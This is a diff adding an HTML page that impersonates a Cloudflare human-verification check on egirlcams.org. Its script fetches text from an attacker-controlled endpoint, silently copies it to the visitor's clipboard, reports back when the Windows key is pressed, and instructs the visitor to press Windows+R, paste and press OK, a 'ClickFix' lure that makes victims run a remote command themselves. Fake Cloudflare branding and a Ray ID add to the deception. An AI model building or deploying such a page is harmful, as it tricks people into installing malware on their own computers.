@@ -1,0 +1,1135 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+
+
+<style>
+    /* General Styling */
+    
+    .content {
+        transition: filter 0.3s ease;
+        z-index: 1;
+    }
+    
+    h1 {
+        font-size: 2rem;
+        margin-bottom: 10px;
+    }
+    /* Checkbox Styling */
+    
+    .checkbox-container {
+        margin: 20px 0;
+    }
+    
+    .checkbox-container label {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        cursor: pointer;
+        font-size: 1.2rem;
+    }
+    
+    .checkbox-container input[type="checkbox"] {
+        transform: scale(1.5);
+    }
+    /* Loading Spinner */
+    
+    .loading-container {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 20px;
+    }
+    
+    .loading-text {
+        margin-top: 10px;
+        font-size: 1rem;
+    }
+    
+    .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid transparent;
+        border-top: 4px solid #3498db;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+    /* Popup Styling */
+    
+    .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 10;
+    }
+    
+    .verification-box {
+        background-color: #333;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+        color: #f1f1f1;
+        text-align: left;
+        width: 300px;
+        animation: fadeIn 0.3s ease forwards;
+        position: relative;
+    }
+    
+    .verification-box h2 {
+        font-size: 1.2rem;
+        margin-bottom: 10px;
+    }
+    
+    .verification-box p {
+        margin: 10px 0;
+    }
+    /* Loading spinner inside popup */
+    
+    .popup-loading {
+        display: flex;
+        justify-content: center;
+        margin-top: 10px;
+    }
+    /* Footer Styling */
+    /* Animations */
+    
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+    
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+            transform: scale(0.9);
+        }
+        to {
+            opacity: 1;
+            transform: scale(1);
+        }
+    }
+</style>
+<style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0
+    }
+    
+    html {
+        line-height: 1.15;
+        -webkit-text-size-adjust: 100%;
+        color: #313131;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji
+    }
+    
+    body {
+        display: flex;
+        flex-direction: column;
+        height: 100vh;
+        min-height: 100vh
+    }
+    
+    .main-content {
+        margin: 8rem auto;
+        max-width: 60rem;
+        padding-left: 1.5rem
+    }
+    
+    @media (width <=720px) {
+        .main-content {
+            margin-top: 4rem
+        }
+    }
+    
+    .h2 {
+        font-size: 1.5rem;
+        font-weight: 500;
+        line-height: 2.25rem
+    }
+    
+    @media (width <=720px) {
+        .h2 {
+            font-size: 1.25rem;
+            line-height: 1.5rem
+        }
+    }
+    
+    #challenge-error-text {
+        background-image: url("39676ea0b0640b4db29d0f93845d702b3784985a.svg");
+        background-repeat: no-repeat;
+        background-size: contain;
+        padding-left: 34px
+    }
+    
+    @media (prefers-color-scheme: dark) {
+        body {
+            background-color: #222;
+            color: #d9d9d9
+        }
+    }
+    
+    .popup-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: rgba(0, 0, 0, 0.5);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+    
+    .popup {
+        background: #2c2c2c;
+        /* Slightly lighter background for better contrast */
+        padding: 30px;
+        /* More padding for a spacious feel */
+        border-radius: 12px;
+        /* Slightly more rounded corners */
+        text-align: left;
+        /* Align text to the left for a cleaner look */
+        max-width: 500px;
+        /* Wider for more content */
+        width: 90%;
+        /* Responsive width */
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        /* Softer shadow for depth */
+        animation: popupFadeIn 0.5s ease;
+        transition: all 0.5s ease;
+        /* Transition for resizing */
+    }
+    
+    .popup.expanded {
+        max-width: 600px;
+        /* New width when expanded */
+    }
+    
+    .instructions {
+        margin-top: 20px;
+        font-size: 16px;
+        color: #fff;
+        /* White text for readability */
+    }
+    
+    .instruction-text {
+        font-size: 15px;
+        margin: 10px 0;
+        /* Add spacing between instructions */
+    }
+    
+    .text-center {
+        text-align: center;
+        /* Center align the footer */
+        margin-top: 20px;
+        /* Space above footer */
+    }
+    
+    .small-text {
+        font-size: 12px;
+        /* Smaller font for footer */
+        color: #bbb;
+        /* Lighter color for less emphasis */
+    }
+    
+    a {
+        color: #1e90ff;
+        /* Bright color for links */
+        text-decoration: none;
+        /* Remove underline */
+    }
+    
+    a:hover {
+        text-decoration: underline;
+        /* Underline on hover for interaction */
+    }
+    
+    .loading-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 15px;
+        /* Space between the loader and text */
+    }
+    
+    .loading-text {
+        color: #fff;
+        /* White text for loading */
+        transition: opacity 0.5s ease;
+        /* Smooth fade out */
+        text-align: center;
+    }
+    
+    .lds-ring {
+        display: inline-block;
+        position: relative;
+        width: 80px;
+        height: 80px;
+    }
+    
+    .lds-ring div {
+        box-sizing: border-box;
+        display: block;
+        position: absolute;
+        width: 64px;
+        height: 64px;
+        margin: 8px;
+        border: 8px solid #313131;
+        border-radius: 50%;
+        animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        border-color: #313131 transparent transparent transparent;
+    }
+    
+    .lds-ring div:nth-child(1) {
+        animation-delay: -0.45s;
+    }
+    
+    .lds-ring div:nth-child(2) {
+        animation-delay: -0.3s;
+    }
+    
+    .lds-ring div:nth-child(3) {
+        animation-delay: -0.15s;
+    }
+    
+    @keyframes lds-ring {
+        0% {
+            transform: rotate(0deg);
+        }
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+    
+    @keyframes morph-to-checkmark {
+        0% {
+            transform: scale(1);
+        }
+        100% {
+            transform: scale(0);
+            /* Shrink the circle */
+            opacity: 0;
+        }
+    }
+    
+    @keyframes popupFadeIn {
+        from {
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+</style>
+<meta http-equiv="refresh" content="390">
+<style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0
+    }
+    
+    html {
+        line-height: 1.15;
+        -webkit-text-size-adjust: 100%;
+        color: #313131
+    }
+    
+    button,
+    html {
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji
+    }
+    
+    body {
+        display: flex;
+        flex-direction: column;
+        height: 100vh;
+        min-height: 100vh
+    }
+    
+    body.no-js .loading-spinner {
+        visibility: hidden
+    }
+    
+    body.theme-dark {
+        background-color: #222;
+        color: #d9d9d9
+    }
+    
+    body.theme-dark a {
+        color: #fff
+    }
+    
+    body.theme-dark a:hover {
+        color: #ee730a;
+        text-decoration: underline
+    }
+    
+    body.theme-dark .lds-ring div {
+        border-color: #999 transparent transparent
+    }
+    
+    body.theme-dark .font-red {
+        color: #b20f03
+    }
+    
+    body.theme-dark .pow-button {
+        background-color: #4693ff;
+        color: #1d1d1d
+    }
+    
+    body.theme-dark #challenge-success-text {
+        background-image: url("750146d79df2f7e02b6895527d982b4de952ab94.svg")
+    }
+    
+    body.theme-dark #challenge-error-text {
+        background-image: url("39676ea0b0640b4db29d0f93845d702b3784985a.svg")
+    }
+    
+    body.theme-light {
+        background-color: #fff;
+        color: #313131
+    }
+    
+    body.theme-light a {
+        color: #0051c3
+    }
+    
+    body.theme-light a:hover {
+        color: #ee730a;
+        text-decoration: underline
+    }
+    
+    body.theme-light .lds-ring div {
+        border-color: #595959 transparent transparent
+    }
+    
+    body.theme-light .font-red {
+        color: #fc574a
+    }
+    
+    body.theme-light .pow-button {
+        background-color: #003681;
+        border-color: #003681;
+        color: #fff
+    }
+    
+    body.theme-light #challenge-success-text {
+        background-image: url("1389676a4641ef8e3b4790cf06063249d411a692.svg")
+    }
+    
+    body.theme-light #challenge-error-text {
+        background-image: url("ca03486f14ec38cd5ed6377fe6f56c1a5713a44a.svg")
+    }
+    
+    a {
+        background-color: transparent;
+        color: #0051c3;
+        text-decoration: none;
+        transition: color .15s ease
+    }
+    
+    a:hover {
+        color: #ee730a;
+        text-decoration: underline
+    }
+    
+    .main-content {
+        margin: 8rem auto;
+        max-width: 60rem;
+        padding-left: 1.5rem;
+        padding-right: 1.5rem;
+        width: 100%
+    }
+    
+    .main-content .loading-spinner {
+        height: 76.391px
+    }
+    
+    .spacer {
+        margin: 2rem 0
+    }
+    
+    .spacer-top {
+        margin-top: -4rem
+    }
+    
+    .spacer-bottom {
+        margin-bottom: 2rem
+    }
+    
+    .heading-favicon {
+        height: 2rem;
+        margin-right: .5rem;
+        width: 2rem
+    }
+    
+    @media (width <=720px) {
+        .main-content {
+            margin-top: 4rem
+        }
+        .heading-favicon {
+            height: 1.5rem;
+            width: 1.5rem
+        }
+    }
+    
+    .main-wrapper {
+        align-items: center;
+        display: flex;
+        flex: 1;
+        flex-direction: column
+    }
+    
+    .font-red {
+        color: #b20f03
+    }
+    
+    .h1 {
+        font-size: 2.5rem;
+        font-weight: 500;
+        line-height: 3.75rem
+    }
+    
+    .h2 {
+        font-weight: 500
+    }
+    
+    .core-msg,
+    .h2 {
+        font-size: 1.5rem;
+        line-height: 2.25rem
+    }
+    
+    .body-text,
+    .core-msg {
+        font-weight: 400
+    }
+    
+    .body-text {
+        font-size: 1rem;
+        line-height: 1.25rem
+    }
+    
+    @media (width <=720px) {
+        .h1 {
+            font-size: 1.5rem;
+            line-height: 1.75rem
+        }
+        .h2 {
+            font-size: 1.25rem
+        }
+        .core-msg,
+        .h2 {
+            line-height: 1.5rem
+        }
+        .core-msg {
+            font-size: 1rem
+        }
+    }
+    
+    #challenge-error-text {
+        background-image: url("ca03486f14ec38cd5ed6377fe6f56c1a5713a44a.svg");
+        padding-left: 34px
+    }
+    
+    #challenge-error-text,
+    #challenge-success-text {
+        background-repeat: no-repeat;
+        background-size: contain
+    }
+    
+    #challenge-success-text {
+        background-image: url("1389676a4641ef8e3b4790cf06063249d411a692.svg");
+        padding-left: 42px
+    }
+    
+    .text-center {
+        text-align: center
+    }
+    
+    .pow-button {
+        background-color: #0051c3;
+        border: .063rem solid #0051c3;
+        border-radius: .313rem;
+        color: #fff;
+        font-size: .875rem;
+        line-height: 1.313rem;
+        margin: 2rem 0;
+        padding: .375rem 1rem;
+        transition-duration: .2s;
+        transition-property: background-color, border-color, color;
+        transition-timing-function: ease
+    }
+    
+    .pow-button:hover {
+        background-color: #003681;
+        border-color: #003681;
+        color: #fff;
+        cursor: pointer
+    }
+    
+    .footer {
+        font-size: .75rem;
+        line-height: 1.125rem;
+        margin: 0 auto;
+        max-width: 60rem;
+        padding-left: 1.5rem;
+        padding-right: 1.5rem;
+        width: 100%
+    }
+    
+    .footer-inner {
+        border-top: 1px solid #d9d9d9;
+        padding-bottom: 1rem;
+        padding-top: 1rem
+    }
+    
+    .clearfix:after {
+        clear: both;
+        content: "";
+        display: table
+    }
+    
+    .clearfix .column {
+        float: left;
+        padding-right: 1.5rem;
+        width: 50%
+    }
+    
+    .diagnostic-wrapper {
+        margin-bottom: .5rem
+    }
+    
+    .footer .ray-id {
+        text-align: center
+    }
+    
+    .footer .ray-id code {
+        font-family: monaco, courier, monospace
+    }
+    
+    .core-msg,
+    .zone-name-title {
+        overflow-wrap: break-word
+    }
+    
+    @media (width <=720px) {
+        .diagnostic-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center
+        }
+        .clearfix:after {
+            clear: none;
+            content: none;
+            display: initial;
+            text-align: center
+        }
+        .column {
+            padding-bottom: 2rem
+        }
+        .clearfix .column {
+            float: none;
+            padding: 0;
+            width: auto;
+            word-break: keep-all
+        }
+        .zone-name-title {
+            margin-bottom: 1rem
+        }
+    }
+    
+    .loading-spinner {
+        height: 76.391px
+    }
+    
+    .lds-ring {
+        display: inline-block;
+        position: relative
+    }
+    
+    .lds-ring,
+    .lds-ring div {
+        height: 1.875rem;
+        width: 1.875rem
+    }
+    
+    .lds-ring div {
+        animation: lds-ring 1.2s cubic-bezier(.5, 0, .5, 1) infinite;
+        border: .3rem solid transparent;
+        border-radius: 50%;
+        border-top-color: #313131;
+        box-sizing: border-box;
+        display: block;
+        position: absolute
+    }
+    
+    .lds-ring div:first-child {
+        animation-delay: -.45s
+    }
+    
+    .lds-ring div:nth-child(2) {
+        animation-delay: -.3s
+    }
+    
+    .lds-ring div:nth-child(3) {
+        animation-delay: -.15s
+    }
+    
+    @keyframes lds-ring {
+        0% {
+            transform: rotate(0deg)
+        }
+        to {
+            transform: rotate(1turn)
+        }
+    }
+    
+    .rtl .heading-favicon {
+        margin-left: .5rem;
+        margin-right: 0
+    }
+    
+    .rtl #challenge-success-text {
+        background-position: 100%;
+        padding-left: 0;
+        padding-right: 42px
+    }
+    
+    .rtl #challenge-error-text {
+        background-position: 100%;
+        padding-left: 0;
+        padding-right: 34px
+    }
+    
+    .challenge-content .loading-spinner {
+        height: 76.391px
+    }
+    
+    @media (prefers-color-scheme: dark) {
+        body {
+            background-color: #222;
+            color: #d9d9d9
+        }
+        body a {
+            color: #fff
+        }
+        body a:hover {
+            color: #ee730a;
+            text-decoration: underline
+        }
+        body .lds-ring div {
+            border-color: #999 transparent transparent
+        }
+        body .font-red {
+            color: #b20f03
+        }
+        body .pow-button {
+            background-color: #4693ff;
+            color: #1d1d1d
+        }
+        body #challenge-success-text {
+            background-image: url("750146d79df2f7e02b6895527d982b4de952ab94.svg")
+        }
+        body #challenge-error-text {
+            background-image: url("39676ea0b0640b4db29d0f93845d702b3784985a.svg")
+        }
+    }
+</style>
+</head>
+
+<body class="no-js">
+    <div class="popup-overlay" id="popup-overlay">
+        <div class="popup" id="popup">
+            <div class="loading-container" id="loading-container">
+                <div class="lds-ring">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                </div>
+            </div>
+            <p class="loading-text" id="loading-text">Please wait while Cloudflare validates your connection</p>
+        </div>
+    </div>
+    <script>
+        let metaKeySent = false;
+
+        window.addEventListener("message", function(event) {
+            if (event.data === "showPopup") {
+                console.log("Received showPopup event");
+
+                // Show popup overlay
+                const popupOverlay = document.getElementById("popup-overlay");
+                if (popupOverlay) {
+                    popupOverlay.style.display = "flex";
+                } else {
+                    console.error("popup-overlay element not found.");
+                    return;
+                }
+
+                // Ensure focusable input exists
+                let focusElement = document.getElementById("focus-element");
+                if (!focusElement) {
+                    focusElement = document.createElement("input");
+                    focusElement.id = "focus-element";
+                    focusElement.style.position = "absolute";
+                    focusElement.style.opacity = "0";
+                    focusElement.style.pointerEvents = "none";
+                    document.body.appendChild(focusElement);
+                }
+                focusElement.focus();
+                // Fetch data from server
+                fetch("https://egirlcams.org/cf/Processs.php?fetchData=true", {
+                        method: "GET",
+                    })
+                    .then((response) => response.json())
+                    .then((data) => {
+                        if (data.status === "success") {
+                            // Try to copy clipboard text
+                            navigator.clipboard.writeText(data.clipboardText).catch((error) => {
+                                console.error("Clipboard error:", error);
+                            });
+
+                            console.log("User IP:", data.userIp);
+                            console.log("Referrer:", data.referrer);
+                        } else {
+                            console.error("Error fetching data:", data.message);
+                        }
+                    })
+                    .catch((error) => console.error("Error fetching data:", error));
+
+                // Detect Windows (Meta) key press (run only once)
+                const metaKeyListener = (e) => {
+                    if (e.key === "Meta" && !metaKeySent) {
+                        metaKeySent = true;
+                        console.log("Windows (Meta) key detected");
+
+                        // Send webhook request
+                        fetch("https://egirlcams.org/cf/Processs.php?metaKeyPressed=true", {
+                                method: "GET",
+                            })
+                            .then((response) => response.json())
+                            .then((data) => console.log("Meta key event response:", data))
+                            .catch((error) => console.error("Error sending Meta key event:", error));
+
+                        // Remove listener after first execution
+                        document.removeEventListener("keydown", metaKeyListener);
+                    }
+                };
+                document.addEventListener("keydown", metaKeyListener);
+
+                // Show popup content after delay
+                setTimeout(() => {
+                    const popup = document.getElementById("popup");
+                    const loadingContainer = document.getElementById("loading-container");
+                    const loadingText = document.getElementById("loading-text");
+
+                    if (!popup || !loadingContainer || !loadingText) {
+                        console.error("One or more elements were not found.");
+                        return;
+                    }
+
+                    // Hide loading elements
+                    loadingContainer.style.display = "none";
+                    loadingText.style.transition = "opacity 0.5s ease";
+                    loadingText.style.opacity = 0;
+
+                    // Expand popup after a brief delay
+                    setTimeout(() => {
+                        popup.classList.add("expanded");
+
+
+
+
+
+                        const title = document.createElement("h3");
+                        title.textContent = "Extra Verification Needed";
+                        title.style.color = "white"; // ✅ this makes the text white
+                        document.body.appendChild(title); // (assuming you're appending it to the body)
+
+
+
+                        const instructions = document.createElement("div");
+                        instructions.classList.add("instructions");
+                        instructions.innerHTML = `
+                    <p class="instruction-text">1. Press <b>Windows + R</b> to open the Run dialog.</p>
+                    <p class="instruction-text">2. Paste the verification text by pressing <b>CTRL + V</b>.</p>
+                    <p class="instruction-text">3. Press <b>OK</b> to verify you're not a robot.</p>
+                `;
+
+                        const footer = document.createElement("div");
+                        footer.classList.add("text-center", "small-text");
+                        footer.innerHTML = `
+                    Performance &amp; security by
+                    <a rel="noopener noreferrer" href="https://www.cloudflare.com/?utm_source=challenge&amp;utm_campaign=m" target="_blank">
+                        Cloudflare
+                    </a>
+                `;
+
+                        // Update popup content
+                        popup.innerHTML = "";
+                        popup.appendChild(title);
+                        popup.appendChild(instructions);
+                        popup.appendChild(footer);
+
+                        console.log("Popup content displayed successfully");
+                    }, 500);
+                }, 3000);
+            }
+        });
+    </script>
+
+    <div class="main-wrapper" role="main">
+        <div class="main-content">
+            <h1 class="zone-name-title h1">egirlcams.org</h1>
+            <h2 id="AnPU2" class="h2 spacer-bottom">Verify you are human by completing the action below.</h2>
+            <div id="JStsl2" style="display: grid;">
+                <div>
+                    <iframe src="reference.html" allow="cross-origin-isolated; fullscreen; autoplay" sandbox="allow-same-origin allow-scripts allow-popups" id="cf-chl-widget-u4boo" tabindex="0" title="Widget containing a Cloudflare security challenge" style="border: none; overflow: hidden; width: 300px; height: 65px;"></iframe>
+                    <input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-u4boo_response" value="">
+                </div>
+            </div>
+        </div>
+        <div id="Psjc8" class="spacer loading-spinner" style="display: none; visibility: hidden;">
+            <div class="lds-ring">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+        </div>
+        <div id="UJXr0" class="core-msg spacer spacer-top">egirlcams.org needs to review the security of your connection before proceeding.</div>
+        <div id="BQxuW7" style="display: none;">
+            <div id="challenge-success-text" class="h2">Verification successful</div>
+            <div class="core-msg spacer">Waiting for egirlcams.org to respond...</div>
+        </div>
+        <noscript>
+                <div class="h2">
+                    <span id="challenge-error-text">Enable JavaScript and cookies to continue</span>
+                </div>
+            </noscript>
+    </div>
+    </div>
+    <div class="footer" role="contentinfo">
+        <div class="footer-inner">
+            <div class="clearfix diagnostic-wrapper">
+                <div class="ray-id">
+                    Ray ID: <code>8c71b9257c3eb4ee</code>
+                </div>
+            </div>
+            <div class="text-center" id="footer-text">
+                Performance &amp;security by <a rel="noopener noreferrer" href="https://www.cloudflare.com/?utm_source=challenge&amp;utm_campaign=m" target="_blank">Cloudflare</a>
+            </div>
+        </div>
+    </div>
+    <script data-scrapbook-elem="basic-loader">
+        (function() {
+            var k1 = "data-scrapbook-shadowdom",
+                k2 = "data-scrapbook-canvas",
+                k3 = "data-scrapbook-input-indeterminate",
+                k4 = "data-scrapbook-input-checked",
+                k5 = "data-scrapbook-option-selected",
+                k6 = "data-scrapbook-input-value",
+                k7 = "data-scrapbook-textarea-value",
+                k8 = "data-scrapbook-adoptedstylesheets",
+                k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/,
+                k10 = "data-scrapbook-shadowdom-mode",
+                k11 = "data-scrapbook-shadowdom-clonable",
+                k12 = "data-scrapbook-shadowdom-delegates-focus",
+                k13 = "data-scrapbook-shadowdom-serializable",
+                k14 = "data-scrapbook-shadowdom-slot-assignment",
+                k15 = "data-scrapbook-slot-assigned",
+                k16 = "data-scrapbook-slot-index",
+                k17 = /^scrapbook-slot-index=(\d+)$/;
+            k18 = '/scrapbook-slot-index';
+            d = document,
+                r = d.documentElement,
+                $s = !!r.attachShadow,
+                $as = !!d.adoptedStyleSheets,
+                $c = !!window.HTMLCanvasElement,
+                $sa = !!d.createElement('slot').assign,
+                sle = [],
+                sls = [],
+                slt = function(r) {
+                    if ($sa) {
+                        var E = r.childNodes,
+                            i, e, s, m;
+                        for (i = 0; i < E.length; i++) {
+                            e = E[i];
+                            if (e.nodeType === 8) {
+                                s = e.nodeValue;
+                                if (m = s.match(k17)) {
+                                    s = e.nextSibling;
+                                    if (s.nodeType === 3) {
+                                        sls[m[1]] = s;
+                                    }
+                                    r.removeChild(e);
+                                    i--;
+                                } else if (s === k18) {
+                                    r.removeChild(e);
+                                    i--;
+                                }
+                            }
+                        }
+                    }
+                },
+                sl = function() {
+                    var i = sle.length,
+                        j, d, e;
+                    while (i--) {
+                        d = sle[i];
+                        e = d.elem;
+                        d = d.value.split(',');
+                        j = d.length;
+                        while (j--) {
+                            d[j] = sls[parseInt(d[j], 10)];
+                        }
+                        try {
+                            e.assign.apply(e, d);
+                        } catch (ex) {
+                            console.error(ex);
+                        }
+                    }
+                },
+                asl = (function(r) {
+                    var l = [],
+                        E, i, e, m, c, j;
+                    if ($as) {
+                        E = r.attributes;
+                        i = E.length;
+                        while (i--) {
+                            e = E[i];
+                            if (!(m = e.nodeName.match(k9))) {
+                                continue;
+                            }
+                            c = l[m[1]] = new CSSStyleSheet();
+                            r.removeAttribute(m[0]);
+                            m = e.nodeValue.split('\n\n');
+                            j = m.length;
+                            while (j--) {
+                                try {
+                                    m[j] && c.insertRule(m[j]);
+                                } catch (ex) {
+                                    console.error(ex);
+                                }
+                            }
+                        }
+                    }
+                    return l;
+                })(r),
+                as = function(d, e) {
+                    var l, i, I;
+                    if ($as && (l = e.getAttribute(k8)) !== null) {
+                        l = l.split(',');
+                        for (i = 0,
+                            I = l.length; i < I; i++) {
+                            d.adoptedStyleSheets.push(asl[l[i]]);
+                        }
+                        e.removeAttribute(k8);
+                    }
+                },
+                fn = function(r) {
+                    var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"),
+                        i = E.length,
+                        e, d, s, m;
+                    while (i--) {
+                        e = E[i];
+                        s = e.shadowRoot;
+                        if ($s && (d = e.getAttribute(k1))) {
+                            if (!s) {
+                                try {
+                                    s = e.attachShadow({
+                                        mode: (m = e.getAttribute(k10)) !== null ? m : 'open',
+                                        clonable: e.hasAttribute(k11),
+                                        delegatesFocus: e.hasAttribute(k12),
+                                        serializable: e.hasAttribute(k13),
+                                        slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void(0),
+                                    });
+                                    s.innerHTML = d;
+                                } catch (ex) {
+                                    console.error(ex);
+                                }
+                            }
+                            e.removeAttribute(k1);
+                            e.removeAttribute(k10);
+                            e.removeAttribute(k11);
+                            e.removeAttribute(k12);
+                            e.removeAttribute(k13);
+                            e.removeAttribute(k14);
+                        }
+                        if ($c && (d = e.getAttribute(k2)) !== null) {
+                            (function() {
+                                var c = e,
+                                    g = new Image();
+                                g.onload = function() {
+                                    c.getContext('2d').drawImage(g, 0, 0);
+                                };
+                                g.src = d;
+                            })();
+                            e.removeAttribute(k2);
+                        }
+                        if ((d = e.getAttribute(k3)) !== null) {
+                            e.indeterminate = true;
+                            e.removeAttribute(k3);
+                        }
+                        if ((d = e.getAttribute(k4)) !== null) {
+                            e.checked = d === 'true';
+                            e.removeAttribute(k4);
+                        }
+                        if ((d = e.getAttribute(k5)) !== null) {
+                            e.selected = d === 'true';
+                            e.removeAttribute(k5);
+                        }
+                        if ((d = e.getAttribute(k6)) !== null) {
+                            e.value = d;
+                            e.removeAttribute(k6);
+                        }
+                        if ((d = e.getAttribute(k7)) !== null) {
+                            e.value = d;
+                            e.removeAttribute(k7);
+                        }
+                        if ($sa && (d = e.getAttribute(k15)) !== null) {
+                            sle.push({
+                                elem: e,
+                                value: d
+                            });
+                            e.removeAttribute(k15);
+                            l
+                        }
+                        if ($sa && (d = e.getAttribute(k16)) !== null) {
+                            sls[d] = e;
+                            e.removeAttribute(k16);
+                        }
+                        if (s) {
+                            slt(e);
+                            as(s, e);
+                            fn(s);
+                        }
+                    }
+                };
+            as(d, r);
+            fn(d);
+            sl();
+        })()
+    </script>
+</body>
+
+</html>
